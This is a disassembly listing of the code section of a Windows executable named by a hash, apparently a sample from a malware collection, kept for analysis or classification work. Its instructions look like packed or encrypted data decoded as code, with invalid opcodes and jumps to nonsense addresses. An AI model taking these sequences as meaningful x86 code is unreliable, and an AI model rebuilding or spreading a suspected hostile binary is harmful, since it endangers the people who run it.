
17f97f51f202c43528f2ea732a87b713883a3ac8fdfc86f4d0fc77d011051c9b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	cmp    eax,0x4fb45f62
  411005:	xor    cl,BYTE PTR [ebx+0x4e]
  411008:	inc    eax
  411009:	and    DWORD PTR [esi],esi
  41100b:	sbb    bl,BYTE PTR [ecx-0x43]
  41100e:	sbb    al,BYTE PTR [ecx]
  411010:	mov    esi,edx
  411012:	jne    0x410ff6
  411014:	adc    al,0x72
  411016:	jae    0x41107f
  411018:	mov    ds:0x4f5aca6a,eax
  41101d:	inc    edx
  41101e:	daa    
  41101f:	mov    DWORD PTR [eax+ebx*2],0x93d5dfa3
  411026:	loope  0x410fab
  411028:	cwde   
  411029:	pop    ds
  41102a:	iret   
  41102b:	xchg   esi,eax
  41102c:	mov    eax,ds:0x86646963
  411031:	fsub   st,st(4)
  411033:	lods   eax,DWORD PTR ds:[esi]
  411034:	xor    BYTE PTR [ebx+0x77],ah
  411037:	adc    DWORD PTR [edi-0x2d],edi
  41103a:	shl    ch,cl
  41103c:	cmp    DWORD PTR [edi+0x77],esi
  41103f:	leave  
  411040:	xchg   esp,eax
  411041:	add    ecx,DWORD PTR [edi]
  411043:	imul   edx,esi,0xffffff8e
  411046:	dec    edi
  411047:	cli    
  411048:	mov    bh,0x81
  41104a:	jmp    FWORD PTR [ebp-0x6c1b33c3]
  411050:	sbb    BYTE PTR [eax],0x87
  411053:	stos   BYTE PTR es:[edi],al
  411054:	cdq    
  411055:	lods   al,BYTE PTR ds:[esi]
  411056:	adc    al,0x35
  411058:	cld    
  411059:	mov    es:0x828860ce,eax
  41105f:	mov    bh,0x98
  411061:	lock lds esi,FWORD PTR [esi+0x11]
  411065:	jb     0x41100e
  411067:	dec    esi
  411068:	inc    edi
  411069:	imul   eax,DWORD PTR ds:0xfc5e18b,0x97b3e17c
  411073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411074:	test   eax,0xcfd63cde
  411079:	cmp    al,0xea
  41107b:	lahf   
  41107c:	pop    es
  41107d:	test   eax,0x5d06adff
  411082:	adc    ebp,ecx
  411084:	mov    edx,0xb8ec8fa1
  411089:	sbb    cl,BYTE PTR [ecx]
  41108b:	pop    edi
  41108c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41108d:	jmp    0x7b55189a
  411092:	shl    al,1
  411094:	mov    ch,0x5b
  411096:	add    al,0x81
  411098:	mov    ds:0x6bf7e9e9,eax
  41109d:	call   0x326d2478
  4110a2:	push   edi
  4110a3:	aad    0x97
  4110a5:	mov    edi,0x413af89c
  4110aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ab:	popa   
  4110ac:	xchg   edx,eax
  4110ad:	xchg   esi,eax
  4110ae:	jno    0x4110eb
  4110b0:	mov    ah,ch
  4110b2:	in     eax,0x10
  4110b4:	mov    bl,0x6a
  4110b6:	loope  0x4110fa
  4110b8:	sti    
  4110b9:	iret   
  4110ba:	xchg   ebp,eax
  4110bb:	std    
  4110bc:	xor    ah,al
  4110be:	lock inc ebx
  4110c0:	test   DWORD PTR [edi+edx*4-0x51],ecx
  4110c4:	stos   DWORD PTR es:[edi],eax
  4110c5:	mov    cl,0x6c
  4110c7:	retf   
  4110c8:	pop    eax
  4110c9:	pop    eax
  4110ca:	mov    ebx,0xee0b85b4
  4110cf:	cld    
  4110d0:	add    al,0x58
  4110d2:	jae    0x41108a
  4110d4:	or     BYTE PTR [edx+0x4cd00fdd],al
  4110da:	cmp    ebx,DWORD PTR [edx]
  4110dc:	leave  
  4110dd:	push   edx
  4110de:	fmul   st,st(7)
  4110e0:	mov    eax,0x9972cbc8
  4110e5:	mov    ebp,0xae949fad
  4110ea:	in     eax,dx
  4110eb:	stc    
  4110ec:	dec    ecx
  4110ed:	fsubr  DWORD PTR [edx+0x23]
  4110f0:	aaa    
  4110f1:	inc    edi
  4110f2:	dec    esp
  4110f3:	call   0xf0b5:0xcdafde8a
  4110fa:	scas   al,BYTE PTR es:[edi]
  4110fb:	cmp    al,0x99
  4110fd:	sub    al,0x39
  4110ff:	mov    DWORD PTR [eax],ebx
  411101:	ins    BYTE PTR es:[edi],dx
  411102:	jp     0x4110bb
  411104:	add    edx,DWORD PTR [edi]
  411106:	jmp    0x4fb5376a
  41110b:	sbb    BYTE PTR [ebp+esi*4+0x39001fe4],0xfa
  411113:	cmp    esp,edi
  411115:	lds    edx,FWORD PTR [esp+eax*8+0x5b]
  411119:	(bad)  
  41111b:	xchg   ecx,eax
  41111c:	pusha  
  41111d:	iret   
  41111e:	ins    BYTE PTR es:[edi],dx
  41111f:	gs leave 
  411121:	or     ah,BYTE PTR [edi]
  411123:	xlat   BYTE PTR ds:[ebx]
  411124:	into   
  411125:	cdq    
  411126:	sbb    al,0x61
  411128:	pop    ss
  411129:	jmp    0xb401:0xd4110dd1
  411130:	xchg   edi,eax
  411131:	stos   DWORD PTR es:[edi],eax
  411132:	mov    eax,ds:0xc0d60683
  411137:	addr16 mov esp,0x9edabbe3
  41113d:	push   cs
  41113e:	ins    DWORD PTR es:[edi],dx
  41113f:	cwde   
  411140:	cdq    
  411141:	mov    al,0xf5
  411143:	jb     0x4111b9
  411145:	push   es
  411146:	jle    0x4111af
  411148:	or     BYTE PTR [esi-0x52c5fdd0],0xd9
  41114f:	inc    edx
  411150:	pop    esp
  411151:	stos   DWORD PTR es:[edi],eax
  411152:	jecxz  0x41112c
  411154:	lock and esi,edx
  411157:	push   ss
  411158:	xlat   BYTE PTR ds:[ebx]
  411159:	(bad)  
  41115a:	jne    0x411183
  41115c:	(bad)  
  41115d:	in     al,dx
  41115e:	xchg   ebp,eax
  41115f:	pop    eax
  411160:	adc    eax,0x2126c87
  411165:	add    dl,dl
  411167:	mov    bh,0xa0
  411169:	(bad)  
  41116a:	mov    cl,0x6e
  41116c:	enter  0xca1c,0x2a
  411170:	rcl    ebp,1
  411172:	inc    ebp
  411173:	ins    DWORD PTR es:[edi],dx
  411174:	and    ebp,DWORD PTR [esi]
  411176:	dec    eax
  411177:	adc    dl,BYTE PTR [ebx+0x61]
  41117a:	mov    ch,0x59
  41117c:	popf   
  41117d:	pop    eax
  41117e:	pop    ds
  41117f:	retf   0xb4dc
  411182:	addr16 jl 0x411155
  411185:	fdivr  QWORD PTR [edi]
  411187:	adc    DWORD PTR [ebx],ebp
  411189:	xchg   edx,eax
  41118a:	popf   
  41118b:	aam    0x4d
  41118d:	stc    
  41118e:	dec    edi
  411190:	fistp  DWORD PTR [eax+ebx*8+0x1f]
  411194:	add    eax,0x52872b83
  411199:	inc    esp
  41119a:	and    DWORD PTR [ecx],eax
  41119c:	xchg   ebx,eax
  41119d:	sbb    BYTE PTR [esi+0x6aa253a8],ch
  4111a3:	out    0x7,eax
  4111a5:	inc    DWORD PTR [esi-0x55]
  4111a8:	jmp    ecx
  4111aa:	cli    
  4111ab:	adc    eax,0x75f21a8f
  4111b0:	daa    
  4111b1:	ss push es
  4111b3:	and    ebx,esp
  4111b5:	pop    esi
  4111b6:	dec    eax
  4111b7:	cmp    cl,0x3e
  4111ba:	fisttp WORD PTR [esi-0x1388a7a3]
  4111c0:	inc    ebp
  4111c1:	test   BYTE PTR [ebx-0x23],ah
  4111c4:	popa   
  4111c5:	mov    ebx,0x129a611a
  4111ca:	aas    
  4111cb:	or     dl,cl
  4111cd:	ret    0x7714
  4111d0:	pop    ebp
  4111d1:	imul   BYTE PTR [edx]
  4111d3:	push   ebp
  4111d4:	cmp    bl,BYTE PTR [esi+0x5c]
  4111d7:	sbb    al,0x57
  4111d9:	fsub   DWORD PTR [esi-0x354c334d]
  4111df:	add    ebx,DWORD PTR [esi+0x50d754cd]
  4111e5:	mov    ebx,0xe8fbef9e
  4111ea:	push   edx
  4111eb:	add    al,0x61
  4111ed:	mov    esi,0xb39088f5
  4111f2:	mov    WORD PTR [esi-0x6b],ss
  4111f5:	xor    BYTE PTR [ebx+0x278ecdfb],0x8a
  4111fc:	outs   dx,BYTE PTR ds:[esi]
  4111fd:	sub    BYTE PTR [ecx-0x76d14d79],0x67
  411204:	sbb    bh,BYTE PTR [edx+0x23]
  411207:	lahf   
  411208:	in     eax,0xd
  41120a:	push   ebp
  41120b:	in     al,dx
  41120c:	outs   dx,DWORD PTR ds:[esi]
  41120d:	and    al,0x77
  41120f:	adc    ebp,esp
  411211:	rcl    BYTE PTR [ecx],0x4d
  411214:	push   0x29
  411216:	mov    cl,0xf2
  411218:	dec    ebp
  411219:	ret    0x6735
  41121c:	in     al,0x84
  41121e:	push   ds
  41121f:	call   0xb4aa:0xcd2e4902
  411226:	pop    ds
  411227:	jae    0x411200
  411229:	call   0xc1cdcff1
  41122e:	inc    edx
  41122f:	xchg   ebp,eax
  411230:	mov    WORD PTR [esi],?
  411232:	rcl    BYTE PTR [esi+eiz*2-0x31],cl
  411236:	scas   eax,DWORD PTR es:[edi]
  411237:	std    
  411238:	or     esi,esi
  41123a:	jbe    0x411215
  41123c:	push   esi
  41123d:	xlat   BYTE PTR ds:[ebx]
  41123e:	xor    cl,al
  411240:	es pop ebp
  411242:	lea    esi,[esi-0x7c]
  411245:	ins    BYTE PTR es:[edi],dx
  411246:	adc    DWORD PTR [eax*4+0x7d91cae2],0x5c
  41124e:	cli    
  41124f:	mov    edi,0x323b0fe5
  411254:	mul    BYTE PTR [ecx-0x16]
  411257:	cli    
  411258:	jnp    0x411236
  41125a:	ds dec ebp
  41125c:	sub    BYTE PTR [ebp+eax*1-0x61],cl
  411260:	add    BYTE PTR [ebx+edi*8+0x4d554572],0x17
  411268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411269:	mov    eax,ds:0x4d5e40ba
  41126e:	(bad)  
  41126f:	sbb    DWORD PTR [eax-0x38],eax
  411272:	cdq    
  411273:	loope  0x411287
  411275:	push   ebx
  411276:	loopne 0x41124c
  411278:	and    al,0x5e
  41127a:	mov    esi,0x6f86f824
  41127f:	imul   ebp,DWORD PTR fs:[edx+0x1e],0x41
  411284:	pop    ebx
  411285:	out    dx,eax
  411286:	jbe    0x41124d
  411288:	mov    ecx,0x9c425652
  41128d:	lock push esi
  41128f:	mov    ebp,0xa29ceee3
  411294:	cdq    
  411295:	sbb    eax,ebp
  411297:	pop    es
  411298:	fmul   DWORD PTR [ecx]
  41129a:	mov    ecx,0x1056bb39
  41129f:	cmp    edx,ecx
  4112a1:	cli    
  4112a2:	retf   
  4112a3:	pop    eax
  4112a4:	push   DWORD PTR [ecx+eiz*8]
  4112a7:	xchg   edx,eax
  4112a8:	test   al,0xc4
  4112aa:	loop   0x4112bb
  4112ac:	sahf   
  4112ad:	jmp    0x1f596740
  4112b2:	or     BYTE PTR [edx],bh
  4112b4:	push   0xffffffef
  4112b6:	sbb    eax,0x191791f
  4112bb:	add    ebp,ebp
  4112bd:	repz cmp al,0xcf
  4112c0:	jne    0x4112b9
  4112c2:	into   
  4112c3:	rcr    DWORD PTR [ebp-0x58b6a281],0x73
  4112ca:	mov    al,0xb
  4112cc:	adc    dh,al
  4112ce:	cmp    edi,DWORD PTR ds:0xbcbc6049
  4112d4:	je     0x4112cb
  4112d6:	(bad)  
  4112d7:	mov    al,ds:0x674b20ee
  4112dc:	push   es
  4112dd:	dec    ebp
  4112de:	ins    BYTE PTR es:[edi],dx
  4112df:	clc    
  4112e0:	je     0x411268
  4112e2:	lds    si,DWORD PTR [esi]
  4112e5:	cmp    DWORD PTR [eax+0x5e],esi
  4112e8:	pop    ecx
  4112e9:	jg     0x4112b6
  4112eb:	xchg   esi,eax
  4112ec:	sbb    al,0x36
  4112ee:	mov    WORD PTR [edi-0x34d435d4],es
  4112f4:	sbb    ah,BYTE PTR [ecx+eiz*1]
  4112f7:	fnstsw WORD PTR [edx]
  4112f9:	aas    
  4112fa:	mov    ecx,DWORD PTR [esp+edi*1-0x56ac3f92]
  411301:	test   DWORD PTR [ecx+0x77],ecx
  411304:	js     0x411355
  411306:	fwait
  411307:	add    eax,0x59c4f010
  41130c:	es jnp 0x411360
  41130f:	(bad)  
  411310:	and    ebx,DWORD PTR [eax+0x670a8e8b]
  411316:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411317:	mov    fs,WORD PTR [ebp+0x72]
  41131a:	adc    esp,edi
  41131c:	repnz pop edx
  41131e:	sbb    ah,BYTE PTR [edx]
  411320:	das    
  411321:	lahf   
  411322:	or     eax,0x3f6a021a
  411327:	shl    BYTE PTR [ebx],cl
  411329:	popa   
  41132a:	push   edi
  41132b:	mov    eax,ds:0x3968d455
  411330:	bound  esp,QWORD PTR [esi]
  411332:	xchg   esp,eax
  411333:	sahf   
  411334:	in     eax,0x94
  411336:	push   cs
  411337:	lods   al,BYTE PTR ds:[esi]
  411338:	popf   
  411339:	push   0xffffffa0
  41133b:	push   eax
  41133c:	out    0xd8,eax
  41133e:	into   
  41133f:	mov    dl,0xa5
  411341:	jns    0x4112dc
  411343:	ret    0x8c7
  411346:	out    dx,eax
  411347:	(bad)  
  411349:	sbb    al,BYTE PTR [eax]
  41134b:	lock pop ecx
  41134d:	sar    DWORD PTR [edx-0x472feb40],cl
  411353:	mov    ebx,ebx
  411355:	sub    dl,BYTE PTR [edx-0x14b43d82]
  41135b:	and    dl,bl
  41135d:	jne    0x411385
  41135f:	aam    0x3f
  411361:	dec    esi
  411362:	(bad)  
  411363:	mov    bh,0xd2
  411365:	cmp    eax,0x9128d60e
  41136a:	(bad)  
  41136b:	mov    edx,0xc3238107
  411370:	mov    esi,gs
  411372:	test   DWORD PTR [ebx],ebp
  411374:	push   cs
  411375:	fs pop ebx
  411377:	rcl    BYTE PTR [eax-0xc],1
  41137a:	or     eax,DWORD PTR [ebx]
  41137c:	sub    DWORD PTR [edi-0x40],esi
  41137f:	add    esi,ebx
  411381:	push   cs
  411382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411383:	sar    DWORD PTR ds:0xb31c195c,0x81
  41138a:	sar    cl,0xb7
  41138d:	int3   
  41138e:	mov    bh,0x30
  411390:	ja     0x411380
  411392:	scas   al,BYTE PTR es:[edi]
  411393:	pop    ss
  411394:	fwait
  411395:	fwait
  411396:	jnp    0x41139e
  411398:	xor    ch,BYTE PTR [ebx+0x7bb768f7]
  41139e:	mov    ah,0x71
  4113a0:	cld    
  4113a1:	and    BYTE PTR [ebx+ebx*8+0x1b786c8],al
  4113a8:	jnp    0x411367
  4113aa:	xor    BYTE PTR [edi],0x69
  4113ad:	ret    0x4cc2
  4113b0:	add    al,0x3e
  4113b2:	in     eax,dx
  4113b3:	adc    ecx,0xffffffb7
  4113b6:	test   al,0xc8
  4113b8:	xchg   esi,eax
  4113b9:	stc    
  4113ba:	test   eax,0xdead17ba
  4113bf:	jmp    0x306a:0x5cb64f3a
  4113c6:	fisubr WORD PTR [eax+0x60709e0c]
  4113cc:	jmp    0x4cdac341
  4113d1:	push   esp
  4113d2:	mov    dl,0x4b
  4113d4:	int3   
  4113d5:	or     ecx,DWORD PTR [ebp-0x2f64d26]
  4113db:	push   eax
  4113dc:	pop    ebp
  4113dd:	and    al,0x6d
  4113df:	in     al,0x4a
  4113e1:	adc    cl,ch
  4113e3:	aas    
  4113e4:	jbe    0x4113fa
  4113e6:	repnz into 
  4113e8:	mov    al,0x75
  4113ea:	dec    eax
  4113eb:	sahf   
  4113ec:	cli    
  4113ed:	in     eax,dx
  4113ee:	sub    ebx,DWORD PTR [edx+0x2c326c24]
  4113f4:	jecxz  0x411463
  4113f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113f7:	(bad)  
  4113f8:	in     al,dx
  4113f9:	jno    0x4113ea
  4113fb:	xor    DWORD PTR [ebx+eax*2+0x56],esi
  4113ff:	sbb    esi,DWORD PTR [eax-0x6d52505b]
  411405:	repz mov cl,0xed
  411408:	jns    0x4113f3
  41140a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41140b:	scas   eax,DWORD PTR es:[edi]
  41140c:	iret   
  41140d:	in     al,dx
  41140e:	pop    esp
  41140f:	and    dl,BYTE PTR [eax]
  411411:	addr16 mov dl,0x75
  411414:	jo     0x41140f
  411416:	daa    
  411417:	fdiv   DWORD PTR [ebx-0x32]
  41141a:	(bad)  [ebp+0x18]
  41141d:	push   ebp
  41141e:	dec    edx
  41141f:	enter  0x3ade,0x59
  411423:	stos   DWORD PTR es:[edi],eax
  411424:	sbb    eax,0x70bcf05d
  411429:	imul   BYTE PTR ds:0xfb41e082
  41142f:	adc    eax,0x6243bbb1
  411434:	shl    BYTE PTR [ebx+eiz*4-0x4b144cec],0xa3
  41143c:	push   esp
  41143d:	mov    cl,BYTE PTR [ebp+0x657856a6]
  411443:	jecxz  0x4114bc
  411445:	dec    eax
  411446:	mov    ch,0x78
  411448:	mov    bl,0x4c
  41144a:	ror    DWORD PTR [ebp+0x604f21af],cl
  411450:	out    dx,eax
  411451:	mov    al,0x96
  411453:	fwait
  411454:	lods   eax,DWORD PTR ds:[esi]
  411455:	inc    ecx
  411456:	in     eax,dx
  411457:	or     esi,DWORD PTR [eax-0x46]
  41145a:	and    edx,DWORD PTR [edi]
  41145c:	test   BYTE PTR [ecx],ah
  41145e:	pushf  
  41145f:	dec    edx
  411460:	jg     0x411462
  411462:	(bad)  
  411463:	pop    ebp
  411464:	mov    ch,0x68
  411466:	addr16 retf 
  411468:	pop    edi
  411469:	and    al,0xca
  41146b:	mov    bh,0xe4
  41146d:	out    dx,al
  41146e:	push   0x4a
  411470:	(bad)  
  411471:	je     0x41149f
  411473:	and    eax,0x9d02d999
  411478:	clc    
  411479:	sbb    al,bl
  41147b:	sub    DWORD PTR [edx],ebx
  41147d:	je     0x411415
  41147f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411481:	ror    DWORD PTR [ebx-0x4740a2f6],cl
  411487:	aam    0x70
  411489:	mov    BYTE PTR [ecx],dh
  41148b:	imul   edx,DWORD PTR [esi+ecx*4-0x689396e6],0x2e44d16d
  411496:	out    dx,al
  411497:	or     ch,BYTE PTR [edi]
  411499:	xchg   BYTE PTR [esi+0xe],bh
  41149c:	dec    eax
  41149d:	or     edx,DWORD PTR [esi]
  41149f:	inc    edi
  4114a0:	xchg   BYTE PTR [ebp+ecx*1+0x74db90a3],dl
  4114a7:	mov    ecx,0xfea69ba
  4114ac:	out    dx,eax
  4114ad:	mov    edi,DWORD PTR [ebx-0x58]
  4114b0:	leave  
  4114b1:	jle    0x411506
  4114b3:	dec    edi
  4114b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114b5:	and    ebp,DWORD PTR [ebx]
  4114b7:	out    dx,al
  4114b8:	popa   
  4114b9:	mov    dh,0x9a
  4114bb:	push   ebp
  4114bc:	fucom  st(3)
  4114be:	pop    es
  4114bf:	stc    
  4114c0:	pop    ss
  4114c1:	push   edx
  4114c2:	push   esp
  4114c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c4:	sbb    BYTE PTR ds:0x28769f30,ah
  4114ca:	loope  0x4114a0
  4114cc:	daa    
  4114cd:	test   cl,al
  4114cf:	mov    dh,0xd8
  4114d1:	setnp  BYTE PTR [ecx-0x61]
  4114d5:	pop    edx
  4114d6:	xchg   ebx,eax
  4114d7:	fadd   DWORD PTR [edi-0x4f4f29c]
  4114dd:	sti    
  4114de:	je     0x41146e
  4114e0:	xor    al,0x5a
  4114e2:	mov    ebx,0x7b1bf4b7
  4114e7:	jmp    0x411507
  4114e9:	jp     0x411508
  4114eb:	int3   
  4114ec:	inc    eax
  4114ed:	int    0x12
  4114ef:	xchg   ebp,eax
  4114f0:	or     DWORD PTR [esp+ebx*1],esi
  4114f3:	mov    ebx,0x433ac249
  4114f8:	dec    edi
  4114f9:	aad    0x5b
  4114fb:	mov    esp,esp
  4114fd:	jo     0x4114da
  4114ff:	sub    BYTE PTR [edx+0x66],bh
  411502:	mov    ds:0x67b722fd,al
  411507:	ss mov al,0x6b
  41150a:	cld    
  41150b:	or     DWORD PTR [esi+ebp*2-0x2a],0x6e
  411510:	cdq    
  411511:	add    al,0x6f
  411513:	adc    ebx,DWORD PTR [edi+esi*2]
  411516:	clc    
  411517:	add    eax,0x5cdd4566
  41151c:	aam    0x30
  41151e:	jne    0x411517
  411520:	aaa    
  411521:	cdq    
  411522:	mov    dl,0x2e
  411524:	sbb    DWORD PTR [esi],0x17ebfb4b
  41152a:	clc    
  41152b:	mov    dl,BYTE PTR [edx-0x66]
  41152e:	xchg   DWORD PTR [ebp-0x18d7b77c],esp
  411534:	shl    BYTE PTR [ebx+0x4a],cl
  411537:	xchg   ebx,eax
  411538:	adc    eax,0xac8bc741
  41153d:	dec    edx
  41153e:	lds    edi,FWORD PTR [eax]
  411540:	mov    esp,0x5d3ab85d
  411545:	mov    WORD PTR [ebp-0xf],gs
  411548:	jge    0x411512
  41154a:	mov    BYTE PTR [ebx+0x6d],bh
  41154d:	sub    BYTE PTR [edx-0x3a],al
  411550:	push   ebp
  411551:	mov    ds:0x588988b3,eax
  411556:	mov    ds,WORD PTR [edi+0x32b617c1]
  41155c:	mov    ah,0xc1
  41155e:	cld    
  41155f:	pop    eax
  411560:	inc    esi
  411561:	cmp    DWORD PTR [edi-0x400a1bc3],edx
  411567:	gs jp  0x41158d
  41156a:	xor    cl,al
  41156c:	aad    0x1a
  41156e:	aas    
  41156f:	(bad)  
  411570:	sahf   
  411571:	dec    ecx
  411572:	in     eax,dx
  411573:	adc    al,0xa1
  411575:	mov    dl,0x3e
  411577:	loope  0x411576
  411579:	and    eax,0x3dccbf0c
  41157e:	fsubr  DWORD PTR [ebx+0x60]
  411581:	ror    DWORD PTR [ebx+0x35ba33bc],1
  411587:	push   eax
  411588:	pushf  
  411589:	mov    esi,0x9f40ac1
  41158e:	jl     0x411604
  411590:	xor    al,0x1f
  411592:	cmp    dl,ah
  411594:	leave  
  411595:	mov    al,ds:0x4024272e
  41159a:	or     ah,ch
  41159c:	loope  0x41159c
  41159e:	xor    DWORD PTR [esi+ecx*2],esp
  4115a1:	cmp    esp,ecx
  4115a3:	inc    edi
  4115a4:	popf   
  4115a5:	sahf   
  4115a6:	adc    edx,DWORD PTR [esi]
  4115a8:	das    
  4115a9:	ret    0x471f
  4115ac:	dec    ebp
  4115ad:	loope  0x4115c7
  4115af:	rcl    DWORD PTR [eax+0x7a90408d],1
  4115b5:	mov    al,ds:0x7a0a6e20
  4115ba:	mov    ebx,0x20dcc584
  4115bf:	fs cmp BYTE PTR ss:[edi],cl
  4115c3:	neg    BYTE PTR [ecx]
  4115c5:	cmovge eax,DWORD PTR [eax]
  4115c8:	xor    al,0xcc
  4115ca:	sub    BYTE PTR [ecx-0x7b1521b8],al
  4115d0:	or     eax,0x3f42f761
  4115d5:	repnz and DWORD PTR [ebp+0x55b4dabc],esp
  4115dc:	fwait
  4115dd:	mov    ah,BYTE PTR [ecx+eax*4+0x4a]
  4115e1:	into   
  4115e2:	ds call 0x509bada5
  4115e8:	fwait
  4115e9:	mov    DWORD PTR [ebp+0x3a4b7baf],ebp
  4115ef:	inc    eax
  4115f0:	xor    al,BYTE PTR [edx]
  4115f2:	test   DWORD PTR [ecx+0x48d51cdf],esp
  4115f8:	add    eax,0xcd988c1d
  4115fd:	fsubr  QWORD PTR [esi-0x40]
  411600:	dec    ebp
  411601:	xchg   ebx,eax
  411602:	or     dh,ah
  411604:	sub    DWORD PTR [edx+0x449ea458],esp
  41160a:	adc    esp,DWORD PTR [eax]
  41160c:	mov    eax,0x31a1764f
  411611:	jmp    0x732c:0x6d1b92e4
  411618:	xor    bl,BYTE PTR [edx]
  41161a:	xor    DWORD PTR [ebx-0x63],0xffffff8a
  41161e:	rcr    DWORD PTR [edi+0x406b5d7a],cl
  411624:	mov    DWORD PTR [ecx-0x37],eax
  411627:	adc    eax,0x2e80f667
  41162c:	xor    BYTE PTR [esi],dh
  41162e:	pop    edi
  411630:	(bad)  
  411631:	loop   0x41163c
  411633:	mov    gs,eax
  411635:	adc    al,0x1e
  411637:	inc    ebp
  411638:	xor    edx,DWORD PTR [ebx+esi*4]
  41163b:	sbb    al,0xc9
  41163d:	mov    cl,0x83
  41163f:	js     0x4115eb
  411641:	pop    esi
  411642:	fistp  DWORD PTR [esi]
  411644:	add    eax,0xbdb367a7
  411649:	push   edi
  41164a:	jbe    0x4116cb
  41164c:	xor    al,0xb4
  41164e:	and    DWORD PTR [ebx+0x74],esi
  411651:	add    eax,0x5ea04a3b
  411656:	aaa    
  411657:	mov    ds:0x898a378d,eax
  41165c:	cmc    
  41165d:	mov    edx,0x32988555
  411662:	out    0xb2,al
  411664:	scas   al,BYTE PTR es:[edi]
  411665:	cmp    BYTE PTR [ecx],ah
  411667:	stos   WORD PTR es:[edi],ax
  411669:	pop    ebp
  41166a:	push   ax
  41166c:	add    BYTE PTR [ecx+0x69432532],ch
  411672:	xchg   edi,eax
  411673:	jmp    0x411632
  411675:	push   cs
  411676:	sub    BYTE PTR [esi],dl
  411678:	dec    ebx
  411679:	push   edi
  41167a:	xor    DWORD PTR [ecx+0x4ec4720e],edx
  411680:	call   0x132:0xbded46ff
  411687:	dec    edx
  411688:	aaa    
  411689:	out    dx,al
  41168a:	xchg   esi,eax
  41168b:	sahf   
  41168c:	xchg   esp,eax
  41168e:	data16 aam 0xbb
  411691:	or     ebp,esp
  411693:	mov    ch,0x21
  411695:	adc    DWORD PTR [eax-0x7d135b4b],0xffffff98
  41169c:	outs   dx,DWORD PTR ds:[esi]
  41169d:	or     ebx,DWORD PTR [edi-0x4c]
  4116a0:	xor    BYTE PTR gs:[edx+ecx*2-0x66b558ac],dl
  4116a8:	loop   0x41166a
  4116aa:	jl     0x4116b7
  4116ac:	pop    ecx
  4116ad:	xor    ch,0x16
  4116b0:	jo     0x4116fe
  4116b2:	aad    0x63
  4116b4:	add    al,0xd7
  4116b6:	push   es
  4116b7:	or     eax,0x6f87525
  4116bc:	jp     0x411724
  4116be:	fcom   st(5)
  4116c0:	jecxz  0x411692
  4116c2:	mov    esp,fs
  4116c4:	dec    eax
  4116c5:	in     al,0x85
  4116c7:	xor    al,0xe3
  4116c9:	(bad)  
  4116ca:	push   0x66f19e14
  4116cf:	(bad)  
  4116d0:	jg     0x41165b
  4116d2:	sub    ecx,edx
  4116d4:	pop    ss
  4116d5:	push   esp
  4116d6:	cs dec ecx
  4116d8:	pop    es
  4116d9:	jmp    0x41172b
  4116db:	adc    al,0xce
  4116dd:	sbb    bl,al
  4116df:	mov    bh,0xb3
  4116e1:	out    0x62,eax
  4116e3:	out    dx,eax
  4116e4:	test   al,0xb3
  4116e6:	hlt    
  4116e7:	inc    eax
  4116e8:	les    ecx,FWORD PTR [eax-0x14abc2f6]
  4116ee:	es mov al,0x2b
  4116f1:	mov    ecx,0x88328293
  4116f6:	stos   BYTE PTR es:[edi],al
  4116f7:	add    cl,BYTE PTR [ecx+ecx*8-0x5a]
  4116fb:	loop   0x4116e7
  4116fd:	mov    eax,0x449731a6
  411702:	or     al,0x3e
  411704:	mov    esi,0xd5f42ecd
  411709:	addr16 push ds
  41170b:	rcr    DWORD PTR [ebp+0x5b725e9],0xca
  411712:	dec    eax
  411713:	cmp    BYTE PTR [ebp+0x56],ch
  411716:	scas   al,BYTE PTR es:[edi]
  411717:	lds    edi,FWORD PTR [edi+0x45b023a8]
  41171d:	out    dx,eax
  41171e:	cli    
  41171f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411720:	sbb    al,0x16
  411722:	mov    ss,WORD PTR [edx+0x58e116b4]
  411728:	fnstsw WORD PTR [eax-0x54]
  41172b:	inc    ebp
  41172c:	push   ecx
  41172d:	jno    0x411722
  41172f:	cwde   
  411730:	mov    edi,0xcf6f4d7c
  411735:	in     al,0x4f
  411737:	mov    ebx,0x9bd60311
  41173c:	ins    BYTE PTR es:[edi],dx
  41173d:	daa    
  41173e:	loope  0x411742
  411740:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411741:	sar    al,cl
  411743:	sbb    al,0x9
  411745:	sar    BYTE PTR [ebx-0x80],1
  411748:	jno    0x4116d7
  41174a:	jle    0x4116d9
  41174c:	loope  0x411754
  41174e:	jnp    0x411758
  411750:	retf   
  411751:	mov    dh,0x6c
  411753:	pop    ecx
  411754:	jmp    0xa93e6a26
  411759:	outs   dx,DWORD PTR ds:[esi]
  41175a:	inc    esi
  41175b:	pop    es
  41175c:	dec    edi
  41175d:	and    eax,0xe66258f0
  411762:	repz fistp WORD PTR [eax]
  411765:	pop    ebp
  411766:	mov    edi,0xa7daf691
  41176b:	fs jno 0x411754
  41176e:	pop    edi
  41176f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411770:	cmp    BYTE PTR [eax],0xfb
  411773:	lea    edi,[edi-0x3922417c]
  411779:	call   0xb5c3:0x131cdc32
  411780:	jle    0x4117b7
  411782:	push   ecx
  411783:	ds je  0x411766
  411786:	out    0x51,al
  411788:	mov    edx,0xd6abeef
  41178d:	rcl    BYTE PTR [esi+0x43],0x29
  411791:	sbb    al,0xcd
  411793:	inc    esp
  411794:	(bad)  
  411795:	mov    ?,WORD PTR [ecx+0x7a341870]
  41179b:	add    ebp,edx
  41179d:	in     eax,0xf0
  41179f:	aas    
  4117a0:	sbb    BYTE PTR [edi],bl
  4117a2:	xchg   esi,eax
  4117a3:	std    
  4117a4:	lods   eax,DWORD PTR ds:[esi]
  4117a5:	aas    
  4117a6:	cmp    al,0x23
  4117a8:	and    eax,DWORD PTR [esi+0x7dbee3c4]
  4117ae:	rep ins DWORD PTR es:[edi],dx
  4117b0:	cld    
